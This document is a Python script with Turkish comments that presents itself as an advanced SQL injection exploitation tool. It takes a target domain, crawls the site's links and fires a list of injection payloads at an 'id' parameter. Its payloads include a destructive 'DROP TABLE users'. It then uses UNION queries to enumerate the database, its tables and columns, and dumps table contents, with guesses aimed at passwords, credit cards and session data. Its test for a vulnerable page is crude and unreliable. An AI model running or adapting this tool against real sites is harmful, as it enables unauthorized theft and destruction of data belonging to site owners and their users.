import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup

# Kullanılacak potansiyel tablo ve sütun isimleri
TABLES = [
    "users", "admin", "accounts", "customers", "orders",
    "employees", "sessions", "transactions", "products", "inventory",
    "logs", "messages", "settings", "config", "feedback",
    "reviews", "payments", "tokens", "cart", "categories"
]

COLUMNS = [
    "id", "username", "password", "email", "credit_card",
    "name", "phone", "address", "dob", "gender",
    "session_id", "ip_address", "login_time", "balance", "order_id",
    "product_id", "category", "amount", "status", "comments"
]

# Yaygın payload listesi
PAYLOADS = [
    "' OR 1=1 -- -",
    "' UNION SELECT NULL, NULL, NULL -- -",
    "' AND 1=1 -- -",
    "' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 65 -- -",
    "' OR EXISTS(SELECT * FROM information_schema.tables) -- -",
    "' UNION SELECT GROUP_CONCAT(table_name), NULL, NULL FROM information_schema.tables WHERE table_schema=database() -- -",
    "' UNION SELECT GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_schema=database() -- -",
    "' OR 'x'='x' -- -",
    "' OR 1=1#",
    "' OR 1=2 -- -",
    "' OR sleep(5) -- -",
    "'; DROP TABLE users; -- -",
    "' AND 1=0 UNION SELECT database(), version(), user() -- -",
    "' AND LENGTH(database()) > 3 -- -",
    "' OR 1=1 UNION SELECT NULL,NULL,NULL -- -",
    "' UNION SELECT @@version, user(), database() -- -",
    "' AND 'abc' LIKE 'a%' -- -",
    "' AND '1'='1' -- -",
    "'; SELECT @@version -- -",
    "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 -- -"
]

# Otomatik hedef URL çıkarma fonksiyonu
def discover_urls(domain):
    print("[*] URL'ler keşfediliyor...")
    base_url = f"http://{domain}" if not domain.startswith("http") else domain
    try:
        response = requests.get(base_url, timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")
        links = [urljoin(base_url, link.get('href')) for link in soup.find_all('a', href=True)]
        valid_urls = [url for url in links if base_url in url]
        print(f"[+] {len(valid_urls)} URL bulundu.")
        return valid_urls
    except Exception as e:
        print(f"Hata: {e}")
        return []

# SQL Injection açık testi
def test_sql_injection(url):
    for payload in PAYLOADS:
        test_url = f"{url}?id={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200 and "error" not in response.text.lower():
                print(f"[+] Açık bulunan URL: {test_url}")
                return test_url
        except Exception as e:
            print(f"Hata: {e}")
    return None

# SQL Injection işlemleri
def perform_sql_injection(url):
    print(f"[+] SQL Injection hedef URL: {url}")
    database_name = get_database_name(url)
    if database_name:
        print(f"[+] Veritabanı: {database_name}")
        tables = get_tables(url)
        for table in tables:
            print(f"[+] Tablo bulundu: {table}")
            columns = get_columns(url, table)
            if columns:
                print(f"[+] {table} tablosundaki sütunlar: {', '.join(columns)}")
                extract_data(url, table, columns)

def get_database_name(url):
    payload = "' UNION SELECT database(), NULL, NULL -- -"
    test_url = f"{url}?id={payload}"
    response = requests.get(test_url, timeout=5)
    if response.status_code == 200:
        print("[+] Veritabanı adı tespit edildi.")
        return extract_response(response.text)
    return None

def get_tables(url):
    payload = "' UNION SELECT GROUP_CONCAT(table_name), NULL, NULL FROM information_schema.tables WHERE table_schema=database() -- -"
    test_url = f"{url}?id={payload}"
    response = requests.get(test_url, timeout=5)
    if response.status_code == 200:
        print("[+] Tablolar tespit edildi.")
        return extract_response(response.text).split(',')
    return TABLES

def get_columns(url, table_name):
    payload = f"' UNION SELECT GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_name='{table_name}' -- -"
    test_url = f"{url}?id={payload}"
    response = requests.get(test_url, timeout=5)
    if response.status_code == 200:
        print(f"[+] {table_name} tablosundaki sütunlar tespit edildi.")
        return extract_response(response.text).split(',')
    return COLUMNS

def extract_data(url, table_name, columns):
    for column_group in [columns[i:i+3] for i in range(0, len(columns), 3)]:
        col_select = ", ".join(column_group)
        payload = f"' UNION SELECT {col_select} FROM {table_name} -- -"
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url, timeout=5)
        if response.status_code == 200:
            print(f"[+] {table_name} tablosundan veri:\n{extract_response(response.text)}")

# Yardımcı fonksiyon: HTML'den veri ayıklama
def extract_response(response_text):
    start = response_text.find("<body>") + 6
    end = response_text.find("</body>")
    return response_text[start:end].strip()

# Ana işlem
if __name__ == "__main__":
    print("Gelişmiş SQL Injection Sömürme Aracı")
    domain = input("Hedef Domain (ör. site.com): ")

    urls = discover_urls(domain)
    for url in urls:
        vulnerable_url = test_sql_injection(url)
        if vulnerable_url:
            perform_sql_injection(vulnerable_url)
            break
